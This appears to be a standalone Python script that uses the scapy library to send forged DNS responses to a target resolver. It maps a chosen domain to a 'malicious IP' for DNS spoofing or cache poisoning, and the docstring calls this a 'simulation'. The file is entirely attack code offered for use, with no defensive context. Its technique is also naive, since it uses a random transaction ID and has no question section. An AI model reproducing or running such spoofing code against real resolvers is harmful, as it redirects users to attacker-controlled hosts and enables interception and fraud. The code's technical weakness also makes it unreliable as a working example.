from scapy.all import *
import logging

# Set up logging for better error handling
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def dns_spoof(target_ip, target_port, spoofed_ip, target_domain):
    """
    Function to simulate DNS spoofing by sending a malicious DNS response to the target DNS resolver.
    
    Args:
    target_ip (str): The IP address of the target DNS resolver.
    target_port (int): The port number (usually 53 for DNS).
    spoofed_ip (str): The malicious IP to redirect the DNS request.
    target_domain (bytes): The domain to spoof (e.g., b"example.com").
    """
    try:
        dns_response = IP(dst=target_ip)/UDP(dport=target_port)/DNS(
            id=RandShort(), qr=1, aa=1, ancount=1, 
            an=DNSRR(rrname=target_domain, ttl=10, rdata=spoofed_ip)
        )
        send(dns_response)
        logging.info(f"Spoofed DNS response sent to {target_ip} for domain {target_domain.decode()}")
    except Exception as e:
        logging.error(f"Error during DNS spoofing: {e}")

